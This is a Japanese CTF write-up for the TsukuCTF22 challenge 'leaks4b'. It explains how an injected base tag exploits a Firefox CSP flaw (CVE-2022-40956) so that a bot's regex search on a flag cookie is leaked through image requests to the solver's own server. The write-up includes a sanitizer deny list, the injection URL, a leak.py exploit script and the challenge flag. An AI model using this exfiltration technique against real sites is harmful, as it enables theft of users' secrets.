---
title: leaks4b
description: Firefoxの1day問題
author: Satoki
genre: Web
solver: 3
point: 500
---

# leaks4b

## 問題文

ケーキをあいまい検索できます。 どれを注文するか迷ってしまいます！！  
`※フラグの形式はTsukuCTF22{[a-z]{7}}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。配布されているソースは厳密なものではありません。フラグの提出回数は3回までとなっています。`  
[http://133.130.96.134:31416](http://133.130.96.134:31416/)   

## 難易度

**hard**  

## 作問にあたって

趣味CTFということもあり、キモイ問題を出しても良いでしょうということで1day問を出しました。  
Mozillaに早めに報告してしまったので、0day問ではなくなってしまいました(CVE-2022-40956)。  
CSSiやReDoSを用いたリークなど非想定解が思い浮かびまくり、修正しました。  
もし、Firefoxの1day以外で解かれた方がいましたらWriteupなどで教えてくれると嬉しいです。  
ちなみにMiscのsoderはこの非想定解から生まれた問題です。  
そして4bは嘘です。  

## 解法

URLとソースが渡される。  
アクセスするとケーキを検索できるページのようだ。  
![site1.png](images/site1.png)  
クローラが設置されており、パティシエが閲覧してくれるようだ。  
![site2.png](images/site2.png)  
ひとまず配布されたソースのapp.pyを見ると、以下のようであった。  

```python
~~~
def cssi_sanitizer(text):
    # XSS could be mitigated by CSP, but CSSi and ReDoS are dangerous.
    deny_list = ["stylesheet", "import", "image", "style", "flag", "link", "img", "\"", "$", "'", "(", ")", "*", "+", ":", ";", "?", "@", "[", "\\", "]", "^", "{", "}"]
    text = text.lower()
    if any([hack in text for hack in deny_list]):
        return "ハッキングケーキ"
    return text

menu = ["チョコレートケーキ, チョコケーキ, chocolatecake", "チーズケーキ, cheesecake", "バナナケーキ, bananacake"]

~~~
@app.route("/")
def top():
    cake = request.args.get("cake", "チョコレートケーキ")
    cake = cssi_sanitizer(cake[:100])
    flag = request.cookies.get("flag")
    # It is not expected to steal the cookie.
    # This is "leaks4b."
    if (flag == FLAG) and (re.findall(cake, FLAG)):
        img = "flag0.jpg"
    elif re.findall(cake, menu[0]):
        img = f"cake0.jpg"
    elif re.findall(cake, menu[1]):
        img = f"cake1.jpg"
    elif re.findall(cake, menu[2]):
        img = f"cake2.jpg"
    else:
        img = f"cake3.jpg"
    nonce = secrets.token_urlsafe(16)
    return f"""<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-{nonce}'; base-uri 'none'; connect-src 'none'; font-src 'none'; form-action 'none'; frame-src 'none'; object-src 'none'; require-trusted-types-for 'script'; worker-src 'none';">
    <script src="https://cdn.tailwindcss.com" nonce="{nonce}"></script>
    <title>Leaks4b</title>
</head>
~~~
"""

~~~
@app.route("/order", methods=["POST"])
def order_post():
    url = request.form.get("url", "____")
    if not url.startswith("http"):
        return "[ERROR] http and https schemes are allowed."
    try:
        with sync_playwright() as p:
            browser = p.firefox.launch()
            context = browser.new_context()
            context.add_cookies([{"name": "flag", "value": FLAG, "httpOnly": True, "url": URL}])
            page = context.new_page()
            page.goto(url, timeout=10000)
            browser.close()
    except Exception as e:
        print(e)
        pass
    return "I received your cake order. Have the flag and wait for your cake!"
~~~
```

`?cake=`に入力した文字を正規表現としてケーキを検索している。  
フラグも検索できるが、cookieがフラグ文字列と一致している場合にのみ検索可能なようで、クローラ以外には不可能と考えられる。  
フラグが検索できた場合に表示される画像は`flag0.jpg`であり、ケーキは`cake0~3.jpg`である。  
この画像にフラグが書かれているのではと予測し、アクセスするが以下の画像が表示されるだけであった。  
![flag0.jpg](images/flag0.jpg)  
一見すると`?cake=`で任意のHTMLタグを差し込め、XSSによってクローラのcookieを取得できそうだがhttpOnlyであるようだ。  
さらにcssi_sanitizerと、とんでもなく厳しいCSPにより守られており、XSSは愚かCSSiも難しい。  
何とかしてクローラのフラグ検索結果の成否をリークしたい。  
ここでユーザ由来の正規表現を使っているため、ReDoSの可能性もあることに気づく。  
幸いCSPにimgの制限はないため、自身のドメインをsrcに設定したimgタグを挿入し、アクセスの有無を確認することでReDoSの応答遅延によってフラグをリークする手法が思い浮かぶ。  
しかしcssi_sanitizerや文字数制限が邪魔をして、これも難しい。  
ここで試しによくある手法であるbaseタグを挿入すると、CSPでnoneであるはずなのになぜかimgのsrcをbaseのhrefへ問い合わせることがわかる。  
これによって、CSPをバイパスしてimgの相対パスがリークできる。  
imgの画像ファイル名は検索結果によって異なるためクローラのフラグ検索結果のオラクルになりえる。  
あとはフラグに一致する正規表現とbaseタグをcssi_sanitizerを躱してクエリに設定してやればよい。  
フラグの`TsukuCTF22{`リークするクエリは以下になる。  

```txt
http://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E
```

baseタグは`|`で設定し、特殊文字と小文字化に注意する(フラグの`{`などは`.`を利用して任意の一文字として埋めてやればよい)。  
リークが行えることがわかったら、`/static/img/flag0.jpg`が来るまで小文字すべてをクローラへ投げてやり、ヒットしたらフラグ文字列に追加し次の文字を探せばよい。  
以下のleak.pyで行う。

```python
import requests

TARGET_URL = "http://133.130.96.134:31416"
LEAK_URL = "http://[自身のサーバ]".replace("http:", "").replace("https:", "")

FLAG = ".suku...22."

for c in "abcdefghijklmnopqrstuvwxyz.":
    res = requests.post(f"{TARGET_URL}/order", data={"url": f"{TARGET_URL}/?cake={FLAG}{c}|%3Cbase%20href={LEAK_URL}%3E"})
    print(res.text)
```

実行し、手動でリークした文字を追加していくとflagが得られた(自動化もできるが手動でも可能なようなflagになっている)。  

## TsukuCTF22{cakeuma}
